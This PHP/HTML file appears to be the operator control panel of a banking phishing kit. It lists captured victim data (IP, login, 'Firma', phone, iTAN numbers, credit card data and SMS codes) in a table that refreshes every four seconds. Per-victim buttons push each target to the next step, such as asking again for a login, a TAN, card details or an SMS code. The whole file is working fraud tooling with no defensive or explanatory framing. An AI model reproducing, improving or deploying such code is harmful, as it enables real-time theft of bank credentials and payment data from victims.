<?php
    include_once 'inc/app.php';
    if( !user_logged_in() ) {
        header("location: index.php");
        exit();
    }
    $results = [];
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);
    $data = $db->get('data');
    $results['data'] = json_encode($data);
?>

<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.12.1/datatables.min.css">

    <link rel="stylesheet" href="assets/css/helpers.css">
    <link rel="stylesheet" href="assets/css/main.css">

    <title>Data</title>
</head>
<body>

    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <a class="navbar-brand" href="data.php"><b>PANEL</b></a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav mt-auto">
                <li class="nav-item">
                    <a class="nav-link" href="data.php">Home</a>
                </li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <a class="nav-link" href="profile.php">Profile</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="inc/users/logout.php">Logout</a>
                </li>
            </ul>
        </div>
    </nav>

    <main id="main" class="mt50">
        <div class="container-fluid">

            <table id="table" class="display" style="width:100%">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>IP</th>
                        <th>Login</th>
                        <th>Firma</th>
                        <th>Phone</th>
                        <th>Itan</th>
                        <th>CC</th>
                        <th>SMS</th>
                        <th>Status</th>
                        <th>Step</th>
                        <th>Options</th>
                    </tr>
                </thead>
                <tfoot>
                    <tr>
                        <th>#</th>
                        <th>IP</th>
                        <th>Login</th>
                        <th>Firma</th>
                        <th>Phone</th>
                        <th>Itan</th>
                        <th>CC</th>
                        <th>SMS</th>
                        <th>Status</th>
                        <th>Step</th>
                        <th>Options</th>
                    </tr>
                </tfoot>
            </table>
            
        </div>
    </main>
    
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
    <script src="https://cdn.datatables.net/v/dt/dt-1.12.1/datatables.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
    <script src="assets/js/main.js"></script>

    <script>

        var table = $('#table').DataTable( {
            responsive: true,
            ajax: "getdata.php",
            order: [[0, 'desc']],
            "columns": [
                {data:"id"},
                {data:"ip"},
                {data:"login"},
                {data:"firma"},
                {data:"phone"},
                {data:"itan"},
                {data:"cc"},
                {data:"sms"},
                {data:"status"},
                {data:"step"},
                {data:"options",
                    render : function(data, type, row) {
                        var buttons = '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=badlogin" class="btn btn-danger btn-sm mr10 mb10"><i class="fas fa-user-times"></i></a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=app" class="btn btn-primary btn-sm mr10 mb10">APP</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=firma" class="btn btn-success btn-sm mr10 mb10">FIRMA</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=badfirma" class="btn btn-danger btn-sm mr10 mb10">FIRMA</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=phone" class="btn btn-success btn-sm mr10 mb10">PHONE</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=badphone" class="btn btn-danger btn-sm mr10 mb10">PHONE</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=itan" class="btn btn-success btn-sm mr10 mb10">ITAN</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=baditan" class="btn btn-danger btn-sm mr10 mb10">ITAN</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=cc" class="btn btn-success btn-sm mr10 mb10">CC</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=sms" class="btn btn-success btn-sm mr10 mb10">SMS</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=badsms" class="btn btn-danger btn-sm mr10 mb10">SMS</a>';
                        buttons += '<a href="inc/queries/update_action.php?ip='+ row.ip +'&action=success" class="btn btn-success btn-sm mr10 mb10"><i class="fas fa-check-circle"></i></a>';
                        buttons += '<a href="edit.php?id='+ row.id +'" class="btn btn-success btn-sm mr10 mb10"><i class="fas fa-pen"></i></a>';
                        buttons += '<a href="inc/queries/delete.php?id='+ row.id +'" class="btn btn-danger btn-sm"><i class="far fa-trash-alt"></i></a>';
                        return buttons;
                    }  
                },
            ],
        } );
         
        setInterval( function () {
            table.ajax.reload(function(){
                var get_w = $('td:contains("W")');
                get_w.each(function( index ) {
                    $(this).closest("tr").css({"background":"#bfc4ff"});
                });
            });
        }, 4000 );

        $(".dropdown-menu span").click(function(){

            var id = $(this).closest('.dropdown-menu').data('id');
            var color = $(this).data('color');
            var this_f = $(this);
            var formdata   = new FormData();
            formdata.append('id',id);
            formdata.append('color',color);
            $.ajax({
                url         : 'inc/queries/action.php',
                type        : 'post',
                contentType : false,
                processData : false,
                dataType    : 'html',
                data        : formdata,
                beforeSend  : function() {

                },
                success     : function( response ) {
                    this_f.closest('.dropdown-menu').siblings('.dropdown-toggle').removeAttr('class').addClass('badge badge-'+ color +' dropdown-toggle')
                },
                complete    : function() {

                },
                error       : function( response ) {

                }
            });
            
       });
    </script>

</body>
</html>